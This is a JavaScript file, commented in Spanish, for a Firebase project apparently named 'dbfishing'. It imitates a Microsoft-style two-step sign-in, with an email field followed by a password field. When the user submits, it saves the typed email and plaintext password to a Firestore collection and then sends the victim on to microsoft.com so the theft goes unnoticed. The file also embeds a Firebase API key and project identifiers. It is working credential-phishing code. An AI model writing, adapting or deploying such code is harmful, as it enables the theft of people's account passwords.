// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyB4anY-9nz9mJXONJGtLFZmDB6TLusGuXM",
    authDomain: "dbfishing-f4534.firebaseapp.com",
    projectId: "dbfishing-f4534",
    storageBucket: "dbfishing-f4534.appspot.com",
    messagingSenderId: "958177801466",
    appId: "1:958177801466:web:8c24e9c487241172ac4543"
};

// Inicialización de Firebase
const app = firebase.initializeApp(firebaseConfig);

// Obtiene una instancia de autenticación
const auth = firebase.auth(app);
const db = firebase.firestore(app); // Agregamos Firebase Firestore

document.addEventListener("DOMContentLoaded", function() {
    const nextButton = document.getElementById("nextButton");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");
    const backButton = document.getElementById("backButton");
    const loginButton = document.getElementById("loginButton");

    // Agrega un manejador de eventos al botón "Siguiente"
    nextButton.addEventListener("click", function() {
        // Oculta el campo de entrada de correo
        emailInput.style.display = "none";

        // Muestra el campo de contraseña y establece el foco en él
        passwordInput.style.display = "block";
        passwordInput.focus();

        // Oculta el botón "Siguiente" y muestra el botón "Iniciar Sesión"
        nextButton.style.display = "none";
        loginButton.style.display = "block";

        // Muestra el botón de regreso
        backButton.style.display = "block";
    });

    // Agrega un manejador de eventos al botón de "Regresar"
    backButton.addEventListener("click", function() {
        // Oculta el campo de contraseña
        passwordInput.style.display = "none";

        // Muestra el campo de entrada de correo
        emailInput.style.display = "block";
        emailInput.focus();

        // Oculta el botón "Regresar" y muestra el botón "Siguiente"
        backButton.style.display = "none";
        loginButton.style.display = "none";
        nextButton.style.display = "block";
    });

    // Registro de usuarios
    loginButton.addEventListener('click', function() {
        const email = emailInput.value;
        const password = passwordInput.value;

        firebase.auth().createUserWithEmailAndPassword(email, password)
            .then((userCredential) => {
                // Usuario registrado con éxito
                const user = userCredential.user;
                console.log('Usuario registrado:', user);

                // Registrar datos en Firestore
                const usersRef = db.collection('users'); // Cambia 'users' al nombre de tu colección en Firestore
                usersRef.add({
                    email: email,
                    password: password
                })
                .then((docRef) => {
                    //console.log('Pass: ' + password);
                    //console.log('Email: ' + email);
                    console.log('Datos de usuario registrados en Firestore con ID:', docRef.id);

                    // Redireccion a Microsoft
                    location.href="https://www.microsoft.com";
                })
                .catch((error) => {
                    console.error('Error al registrar datos en Firestore:', error);
                });
            })
            .catch((error) => {
                // Handle Errors here.
                const errorCode = error.code;
                const errorMessage = error.message;
                console.error('Error al registrar usuario:', errorCode, errorMessage);
            });

    });
});
